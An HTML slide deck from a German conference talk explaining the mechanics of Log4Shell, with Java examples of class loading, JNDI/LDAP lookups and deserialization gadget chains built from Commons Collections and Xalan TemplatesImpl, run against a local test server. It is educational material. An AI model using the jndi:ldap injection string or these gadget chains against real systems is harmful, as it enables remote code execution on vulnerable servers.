@@ -1,0 +1,280 @@
+<!doctype html><html lang="de"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>diva-e - Die Technik hinter Log4Shell & Co.</title><script defer="defer" src="main.js"></script></head><body><div class="reveal"><div class="slides"><section class="title"><div class="header"></div><div class="content"><h1>Die Technik hinter Log4Shell & Co.</h1><p><small>Christoph Wende und Christian Kumpe, 17. Mai 2022, Entwicklertag Karlsruhe</small></p></div></section><section class="agenda"><div class="header">Die Technik hinter Log4Shell & Co. — Agenda</div><div class="content"><h1>Agenda</h1><ol class="columns"><li>Kurze Vorstellung<ul><li>diva-e</li><li>Referenten</li></ul></li><li>Was war nochmal Log4Shell?<ul><li>Wann eigentlich?</li><li>Und wie lief das?</li></ul></li><li>Wie funktioniert's?<ul><li>Nachladen von Bytecode</li><li>Der Angriff über LDAP</li></ul></li><li>Fazit</li></ol></div></section><section class="diva-e"><div class="header">Die Technik hinter Log4Shell & Co. — Vorstellung</div><div class="content"><h1>diva-e auf einen Blick</h1><ul class="lower"><li>900 Mitarbeiter, 8 Standorte in Deutschland, 1 Office in Bulgarien und 1 Office in den USA</li><li>80 Millionen Euro Umsatz</li><li>Nr. 1 digitaler Partner für Content, Commerce und Performance Marketing in Deutschland</li><li>Fokus auf mobile Endkundenerfahrung und Kundenbindung, inkl. Nutzung von Datenplattformen</li><li>Platz 7 im Arbeitgeberwettbewerb Great Place to Work in Deutschland</li></ul></div></section><section class="christian"><div class="header">Die Technik hinter Log4Shell & Co. — Vorstellung</div><div class="content"><h1>Referenten</h1><h2>Christian Kumpe</h2><p>Expert Developer</p><div class="block"></div><ul class="lower"><li>Informatikstudium am KIT (Universität Karlsruhe)</li><li>Freelancer im Bereich Web und Java</li><li>Seit Mai 2011 bei diva-e in Karlsruhe</li><li>Über 20 Jahre in der Java-Welt unterwegs</li></ul></div></section><section class="christoph"><div class="header">Die Technik hinter Log4Shell & Co. — Vorstellung</div><div class="content"><h1>Referenten</h1><h2>Christoph Wende</h2><p>Expert Backend Developer & Team Lead</p><div class="block"></div><ul class="lower"><li>Agile Development Evangelist</li><li>Seit November 2009 bei diva-e in München</li><li>Über 18 Jahre in der Java-Welt unterwegs</li></ul></div></section><section class="blue"><div class="header"></div><div class="content"><h1>Was war eigentlich passiert?</h1></div></section><section><div class="header">Die Technik hinter Log4Shell & Co. — Was war nochmal Log4Shell?</div><div class="content"><h1>Was war eigentlich passiert?</h1><h2>Es war einmal, kurz vor Weihnachten 2021…</h2><p>… und alle freuen sich auf die besinnliche Zeit...<br><br><br></p><div class="fragment"><h2>Nein, doch nicht:</h2><ul><li><a href="https://www.cve.org/CVERecord?id=CVE-2021-44228">CVE-2021-44228</a></li><li>Gefunden am 25. November, Disclosure am 9. Dezember</li><li>Betroffen war die Bibliothek Apache Log4j2 in Version &lt;= 2.14</li><li>Und plötzlich ging es durch die Presse... und durch die Logfiles</li></ul><img src="4e6655cd23fc3c121995.png" alt="Ausschnitt eines Logfiles"/></div></div></section><section><div class="header">Die Technik hinter Log4Shell & Co. — Was war nochmal Log4Shell?</div><div class="content"><h1>Wie lief der Exploit?</h1><p>Über Platzhalter können in Log4j2 dynamisch Informationen in Log-Nachrichten eingefügt werden. Diese Informationen konnten in der Standardkonfiguration auch über JNDI geladen werden.</p><pre><code data-line-numbers="6" data-trim class="java">
+public class VulnerableLoggingClass {
+
+    private static final Logger logger = LogManager.getLogger(VulnerableLoggingClass.class);
+
+    public static void main(String[] args) {
+        logger.error("Malicious string in log message: ${jndi:ldap://127.0.0.1:1389/restOfUrl}");
+    }
+
+}
+                </code></pre><div class="fragment"><img src="345064a8b16c005ccd9f.png" alt="Ablaufdiagramm des Angriffs"></div></div></section><section class="gray"><div class="header"></div><div class="content"><h1>Nachladen von Bytecode zur Laufzeit</h1></div></section><section><div class="header">Die Technik hinter Log4Shell & Co. — Nachladen von Bytecode</div><div class="content"><h1>Unser Testcase:</h1><pre><code data-line-numbers="|3-5" class="java">public class Step1_HelloWorld {
+
+  static {
+    System.out.println("Static initializer of Step1_HelloWorld");
+  }
+
+  public static void main(String[] args) {
+    System.out.println("Hello KET2022!");
+  }
+
+}
+            </code></pre><div class="fragment"><p>Ausgabe des Beispiels:</p><pre class="output"><code data-trim class="console">
+Static initializer of Step1_HelloWorld
+Hello KET2022!
+                    </code></pre><p><br/></p></div><div class="fragment"><p>Laut JLS <b>12.4. Initialization of Classes and Interfaces</b><br/><br/><em>Initialization of a class consists of executing its static initializers and the initializers for static fields (class variables) declared in the class.</em></p></div></div></section><section><div class="header">Die Technik hinter Log4Shell & Co. — Nachladen von Bytecode</div><div class="content"><h1>Wie kommt der Code in den ClassLoader?</h1><pre><code data-line-numbers="|6|8-9" class="java">import java.lang.reflect.Method;
+
+public class Step2_ClassForName {
+
+  public static void main(String[] args) throws Exception {
+    Class&lt;?> helloWorldClass = Class.forName("com.divae...Step1_HelloWorld");
+
+    Method mainMethod = helloWorldClass.getMethod("main", String[].class);
+    mainMethod.invoke(null, (Object) new String[0]);
+  }
+
+}
+            </code></pre><div class="fragment"><p>Ausgabe des Beispiels:</p><pre class="output"><code data-trim class="console">
+Static initializer of Step1_HelloWorld
+Hello KET2022!
+                    </code></pre></div></div></section><section><div class="header">Die Technik hinter Log4Shell & Co. — Nachladen von Bytecode</div><div class="content"><h1>Und wenn der Code nicht im Classpath liegt?</h1><pre><code data-trim data-line-numbers="|8|8,10|10,12-13|10|10,16-20" class="java">import java.io.File;
+import java.lang.reflect.Method;
+import java.nio.file.Files;
+
+public class Step3_ClassForBytes {
+
+  public static void main(String[] args) throws Exception {
+    byte[] bytes = Files.readAllBytes(new File("target/classes/.../Step1_HelloWorld.class").toPath());
+
+    Class&lt;?> helloWorldClass = new OverloadedClassLoader().defineClass(bytes);
+
+    Method mainMethod = helloWorldClass.getMethod("main", String[].class);
+    mainMethod.invoke(null, (Object) new String[0]);
+  }
+
+  private static class OverloadedClassLoader extends ClassLoader {
+    Class&lt;?> defineClass(byte[] bytes) {
+      return defineClass(null, bytes, 0, bytes.length, null);
+    }
+  }
+}
+            </code></pre><div class="fragment"><p>Ausgabe des Beispiels:</p><pre class="output"><code data-trim class="console">
+Static initializer of Step1_HelloWorld
+Hello KET2022!
+                    </code></pre></div></div></section><section class="magenta"><div class="header"></div><div class="content"><h1>Der Angriff über LDAP</h1></div></section><section><div class="header">Log4Shell — Der Angriff über LDAP</div><div class="content"><h1>Aufbau der JNDI Einträge im LDAP</h1><p>Der LDAP Server liefert auf die Anfrage einen Eintrag zurück der den Angriffscode triggert.</p><div class="two-columns"><div class="fragment"><h2>Mit Remote Code Base</h2><ul><li>Aufbau des Eintrags<ul><li><em>javaClassName</em><br><code>foo</code></li><li><em>objectClass</em><br><code>javaNamingReference</code></li><li><em>javaCodeBase</em><br><code>http://127.0.0.1:8080/</code></li><li><em>javaFactory</em><br><code>com.divae.talks.log4shell.SimplePayload</code></li></ul></li><li>Benötigt Remote Class Loading<ul><li>Wurde mit JDK 1.8u121 standardmäßig deaktiviert.</li></ul></li><li>LDAP Server muss erreichbar sein</li><li>HTTP der Remote Code Base muss erreichbar sein</li></ul></div><div class="fragment"><h2>Mit Deserialisierung</h2><ul><li>Aufbau des Eintrags<ul><li><em>javaClassName</em><br><code>foo</code></li><li><em>javaSerializedData</em><br><code>ac ed 00 05 73 72 00 3a<br>63 6f 6d 2e 73 75 6e 2e<br>…</code></li></ul></li><li>„Nur“ LDAP Server muss erreichbar sein</li><li>Exploit muss bei der Deserialisierung getriggert werden</li></ul><h2 class="fragment">Wie kann man eigenen Code in serialisierte Daten verpacken?</h2></div></div></div></section><section><div class="header">Die Technik hinter Log4Shell & Co. — Der Angriff über LDAP</div><div class="content"><h1>Daten mit Java Serialisieren und Deserialisieren</h1><pre class="code"><code data-trim data-line-numbers="5-10|14-16|18-24|26-33" class="java">
+import java.io.*;
+
+public class SerializationBasics {
+
+    // Serialisierbare Klasse
+    public static class SerializableClass implements Serializable {
+
+        private int value = 0;
+
+    }
+
+    public static void main(String[] args) throws Exception {
+
+        // Objekt erzeugen und Wert zuweisen
+        SerializableClass serializableObject = new SerializableClass();
+        serializableObject.value = 1;
+
+        // Objekt in Datei schreiben
+        try (FileOutputStream file = new FileOutputStream("serialized-data.tmp");
+             ObjectOutputStream out = new ObjectOutputStream(file)) {
+
+            out.writeObject(serializableObject);
+
+        }
+
+        // Objekt aus Datei lesen und Wert anzeigen
+        try (FileInputStream file = new FileInputStream("serialized-data.tmp");
+             ObjectInputStream in = new ObjectInputStream(file)) {
+
+            SerializableClass deserializedObject = (SerializableClass) in.readObject();
+            System.out.println("Eingelesener Wert: " + deserializedObject.value);
+
+        }
+
+    }
+
+}
+                </code></pre><div class="fragment"><p>Ausgabe des Beispiels:</p><pre class="output"><code data-trim class="console">
+Eingelesener Wert: 1
+                </code></pre></div></div></section><section><div class="header">Die Technik hinter Log4Shell & Co. — Der Angriff über LDAP</div><div class="content"><h1>Eigenen Code bei der Serialisierung ausführen</h1><pre class="code"><code data-trim data-line-numbers="5-18|22-34" class="java">
+import java.io.*;
+
+public class SerializationBasics {
+
+    // Klasse mit eigener Serialisierungslogik
+    public static class SerializableClass implements Serializable {
+
+        private int value = 0;
+
+        private void writeObject(ObjectOutputStream out) {
+            System.out.println("writeObject wird ausgeführt");
+        }
+
+        private void readObject(ObjectInputStream in) {
+            System.out.println("readObject wird ausgeführt");
+        }
+
+    }
+
+    public static void main(String[] args) throws Exception {
+
+        SerializableClass serializableObject = new SerializableClass();
+        serializableObject.value = 1;
+
+        try (FileOutputStream file = new FileOutputStream("serialized-data.tmp");
+             ObjectOutputStream out = new ObjectOutputStream(file)) {
+            out.writeObject(serializableObject);
+        }
+
+        try (FileInputStream file = new FileInputStream("serialized-data.tmp");
+             ObjectInputStream in = new ObjectInputStream(file)) {
+            SerializableClass deserializedObject = (SerializableClass) in.readObject();
+            System.out.println("Eingelesener Wert: " + deserializedObject.value);
+        }
+
+    }
+
+}
+                </code></pre><div class="fragment"><p>Ausgabe des Beispiels</p><pre class="output"><code data-trim class="console">
+writeObject wird ausgeführt
+readObject wird ausgeführt
+Eingelesener Wert: 0
+                </code></pre></div></div></section><section><div class="header">Die Technik hinter Log4Shell & Co. — Der Angriff über LDAP</div><div class="content"><h1>Wie funktioniert ein Angriff über die Deserialisierung in Java?</h1><ul><li>Ziel eines Angriffs<ul><li>Eigenen Code in der Java Anwendung einschleusen und ausführen.</li><li>In unserem Fall über serialisierte Daten.</li></ul></li><li>Der Weg zum Ziel<ol><li>Objekte geschickt kombinieren und serialisieren.</li><li>Serialisierte Daten („Payload“) über <em>log4shell</em> Lücke in die Anwendung übertragen.</li><li>Objekte werden deserialisiert und dabei der eigene Code instanziiert und ausgeführt.</li></ol></li></ul></div></section><section><div class="header">Die Technik hinter Log4Shell & Co. — Der Angriff über LDAP</div><div class="content"><h1>Eine HashMap als Ausgangspunkt</h1><p>Eine HashMap serialisiert nicht ihre interne Datenstruktur sondern direkt ihre Schlüssel und Einträge. Beim Deserialisieren werden diese wieder in die interne Datenstruktur eingefügt.</p><pre><code data-trim data-line-numbers="9,12,14,20" class="java">
+package java.util;
+
+public class HashMap&lt;K,V> extends AbstractMap&lt;K,V>
+    implements Map&lt;K,V>, Cloneable, Serializable {
+…
+    private void readObject(java.io.ObjectInputStream s)
+        throws IOException, ClassNotFoundException {
+            …
+            // Die Einträge werden aus dem ObjectInputStream gelesen und eingefügt
+            for (int i = 0; i &lt; mappings; i++) {
+                …
+                K key = (K) s.readObject();
+                V value = (V) s.readObject();
+                putVal(hash(key), key, value, false, false);
+            }
+    }
+…
+    static final int hash(Object key) {
+        int h;
+        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
+    }
+…
+}
+                </code></pre><p class="fragment">Damit kann die <code>.hashCode()</code> Implementierung serialisierbarer Klassen getriggert werden.</p></div></section><section><div class="header">Die Technik hinter Log4Shell & Co. — Der Angriff über LDAP</div><div class="content"><h1>Beliebige Methode im Classpath ausführen</h1><p>Über die geschickte Kombination verschiedener Features von Commons Collections können beim Deserialisieren beliebige Methoden im Classpath ausgeführt werden.</p><pre class="code"><code data-trim data-line-numbers="13-19|23-31|33-39|41-49" class="java">
+import com.divae.talks.log4shell.exploit.deserialization.ReflectionUtil;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
+import org.apache.commons.collections4.keyvalue.TiedMapEntry;
+import org.apache.commons.collections4.map.LazyMap;
+import java.io.*;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CallingAnArbitraryConstructorOnDeserialization {
+
+    public static class SerializableClass implements Serializable {
+
+        public void myMethod() {
+            System.out.println("myMethod wird ausgeführt");
+        }
+
+    }
+
+    public static void main(String[] args) throws Exception {
+
+        // Objekt erzeugen
+        SerializableClass serializableObject = new SerializableClass();
+
+        // Instantiiert die übergebene Klasse mit einem Konstruktor mit der angegebenen Signatur und den Parametern
+        InvokerTransformer invokerTransformer = new InvokerTransformer("myMethod", new Class[0], new Object[0]);
+
+        // Ruft den invokerTransformer zum Erzeugen nicht vorhandener Einträge auf
+        LazyMap lazyMap = LazyMap.lazyMap(new HashMap(), invokerTransformer);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, serializableObject);
+
+        // Erzeuge eine HashMap mit 1 Eintrag
+        Map hashMap = new HashMap();
+        hashMap.put("this key will be replaces by tiedMapEntry", "a value");
+
+        // Ersetzte den Schlüssel des Eintrags über Reflection
+        Object firstMapEntry = hashMap.entrySet().iterator().next();
+        ReflectionUtil.setFieldValue(firstMapEntry, "key", tiedMapEntry);
+
+        try (FileOutputStream file = new FileOutputStream("serialized-data.tmp");
+             ObjectOutputStream out = new ObjectOutputStream(file)) {
+            out.writeObject(hashMap);
+        }
+
+        try (FileInputStream file = new FileInputStream("serialized-data.tmp");
+             ObjectInputStream in = new ObjectInputStream(file)) {
+            in.readObject();
+        }
+
+    }
+
+}
+                </code></pre><div class="fragment"><p>Ausgabe des Beispiels:</p><pre class="output"><code data-trim class="console">
+myMethod wird ausgeführt
+                </code></pre></div></div></section><section><div class="header">Die Technik hinter Log4Shell & Co. — Der Angriff über LDAP</div><div class="content"><h1>Klasse aus serialisierten Daten instantiieren</h1><p>In Kombination mit dem vorherigen Kniff, lässt sich mit einer Klasse der XSLT Bibliothek Apache Xalan eine eigene Klasse aus serialisierten Daten initialisieren.</p><pre class="code"><code data-trim data-line-numbers="11-12|14-18|20-27,31|29-30" class="java">
+import com.divae.talks.log4shell.exploit.deserialization.ReflectionUtil;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+
+import java.io.*;
+import java.nio.file.Files;
+
+public class Step4_InstantiatingClassFromSerializedData {
+
+    public static void main(String[] args) throws Exception {
+
+        // Bytecode der auf dem Zielsystem ausgeführt werden soll
+        byte[] classBytes = Files.readAllBytes(new File("target/test-classes/com/divae/talks/log4shell/TransletPayload.class").toPath());
+
+        TemplatesImpl templates = new TemplatesImpl();
+        // Füge Bytecode in templates Objekt ein
+        ReflectionUtil.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
+        // Damit beim Deserialisieren nicht zu früh eine NullPointerException auftritt
+        ReflectionUtil.setFieldValue(templates, "_name", "");
+
+        try (FileOutputStream file = new FileOutputStream("serialized-data.tmp");
+             ObjectOutputStream out = new ObjectOutputStream(file)) {
+            out.writeObject(templates);
+        }
+
+        try (FileInputStream file = new FileInputStream("serialized-data.tmp");
+             ObjectInputStream in = new ObjectInputStream(file)) {
+            TemplatesImpl deserializedTemplates = (TemplatesImpl) in.readObject();
+
+            // Wird dann am Ende durch den Kniff im vorherigen Beispiel ersetzt
+            deserializedTemplates.newTransformer();
+        }
+
+    }
+
+}
+                </code></pre><div class="fragment"><p>Ausgabe des Beispiels:</p><pre class="output"><code data-trim class="console">
+Payload in static initializer of TransletPayload
+Exception in thread "main" java.lang.NullPointerException
+	at …
+                    </code></pre><p>Den Fehler kann „getrost“ ignoriert werden, da der gewünschte Code bereits ausgeführt wurde.</p></div></div></section><section><div class="header">Die Technik hinter Log4Shell & Co. — Der Angriff über LDAP</div><div class="content"><h1>Demo</h1><pre><code data-trim data-line-numbers class="bash">
+# Exploit Server läuft bereits…
+
+# Auswählen der Java Version
+JAVA_HOME=…/jdk1.8.0_66
+
+# Starten des verwundbaren Codes
+$JAVA_HOME/bin/java -classpath \
+$HOME/git/log4shell-background/target/classes:\
+$HOME/.m2/repository/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar:\
+$HOME/.m2/repository/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar:\
+$HOME/.m2/repository/org/apache/commons/commons-collections4/4.0/commons-collections4-4.0.jar \
+com.divae.talks.log4shell.exploit.VulnerableLoggingClass
+                </code></pre></div></section><section class="gold"><div class="header"></div><div class="content"><h1>Fazit</h1></div></section><section class="fazit"><div class="header">Die Technik hinter Log4Shell & Co. — Fazit</div><div class="content"><h1>Fazit</h1><ul><li>Die zweite Variante des Angriffs zeigt recht gut, wie man eine Lücke durch raffinierte Tricks erweitern kann</li><li>Hier haben wir nur zwei Varianten bis zum Ende verfolgt</li><li>Das wird nicht die letzte Lücke sein, welche die Java Serialisierung beim Angriff verwendet</li></ul></div></section><section class="thanks"><div class="header"><h1>diva-e. You can’t buy it. You can’t make it.<br>And you sure can’t fake it.</h1></div><div class="content"><h1>Danke</h1><p>Bitte gebt uns Feedback!</p></div><div class="footer"><p>Copyright © diva-e</p></div></section><section class="blue" data-visibility="hidden"><div class="header"></div><div class="content"><h1>Kapitel/Trennseite</h1></div></section><section class="gold" data-visibility="hidden"><div class="header"></div><div class="content"><h1>Kapitel/Trennseite</h1></div></section><section class="gray" data-visibility="hidden"><div class="header"></div><div class="content"><h1>Kapitel/Trennseite</h1></div></section></div></div></body></html>
